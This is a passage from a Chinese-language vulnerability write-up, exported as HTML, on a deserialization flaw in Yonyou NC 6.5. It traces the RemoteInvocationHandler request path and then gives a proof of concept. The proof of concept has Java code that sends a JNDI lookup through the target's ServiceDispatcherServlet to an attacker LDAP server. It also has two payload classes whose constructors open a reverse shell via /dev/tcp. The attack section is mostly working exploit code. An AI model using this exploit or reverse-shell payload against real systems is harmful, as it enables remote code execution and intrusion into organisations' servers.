&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (mn.equals(&quot;hashCode&quot;) &amp;&amp; ps.length == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return this.meta.hashCode() + 27 * this.ras.hashCode();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (mn.equals(&quot;toString&quot;) &amp;&amp; ps.length == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return this.meta.toString();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return method.getDeclaringClass() == RemoteProxy.class ? method.invoke(this, args) : this.sendRequest(method, args);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时</span><span class="cs8926E06">mn</span><span class="cs9C1B1871">的值为</span><span class="cs8926E06">&ldquo;lookup&rdquo;</span><span class="cs9C1B1871">，因此会进入最后一条分支语句中，又因为二者不等，最终会执行</span><span class="cs8926E06">this.sendRequest(method, args)</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">//nc.bs.framework.rmi.RemoteInvocationHandler#sendRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public Object sendRequest(Method method, Object[] args) throws Throwable {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InvocationInfo ii = this.newInvocationInfo(method, args);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Address old = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int retry = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ConnectorFailException error = null;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Address target = this.ras.select();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (old != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logger.error(&quot;connect to: &quot; + old + &quot; failed, now retry connect to: &quot; + target);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (old.equals(target)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(this.retryInterval);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception var13) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.restoreToken(ii, target);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object var8 = this.sendRequest(target, ii, method, args);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return var8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (ConnectorFailException var14) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++retry;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;old = target;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error = var14;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} finally {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.storeToken(ii, target);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} while(retry &lt; this.retryMax);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw error;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">this.sendRequest(target, ii, method, args)</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image16.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到该方法中将</span><span class="cs8926E06"> ii </span><span class="cs9C1B1871">序列化输出，发送到服务端，然后获取服务端返回的反序列化结果并回显到客户端。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image0.gif" width="560" height="303" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs8926E06">explpit.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">import nc.bs.framework.common.NCLocator;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.util.Properties;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class poc {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void attack(String url, String jndipath) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Properties env = new Properties();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!url.startsWith(&quot;http&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = &quot;http://&quot; + url;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;/ServiceDispatcherServlet&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NCLocator locator = NCLocator.getInstance(env);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locator.lookup(jndipath);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;attack(&quot;http://target&quot;, &quot;ldap://ip:port/classname&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs8926E06">remote.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">import javax.naming.Context;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.naming.Name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.naming.spi.ObjectFactory;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.Serializable;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.util.Hashtable;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class remote implements ObjectFactory, Serializable {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public remote() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">当然也可以选择利用</span><span class="cs8926E06"> nc </span><span class="cs9C1B1871">自带的类进行远程部署利用</span></p><p class="cs3A447A38"><span class="cs9FB05234">import nc.bs.framework.common.ComponentMetaVO;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import nc.bs.framework.rmi.RemoteAddressSelector;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import nc.bs.framework.rmi.RemoteProxy;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class remote implements RemoteProxy {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public remote() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public Object getAttribute(String s) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setAttribute(String s, Object o) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public ComponentMetaVO getComponentMetaVO() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int getRetryMax() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setRetryMax(int i) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public long getRetryInterval() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setRetryInterval(long l) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setRemoteAddressSelector(RemoteAddressSelector remoteAddressSelector) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public RemoteAddressSelector getRemoteAddressSelector() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/8242</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://blog.sari3l.com/posts/608d18f0/</span></p></body>
</html>
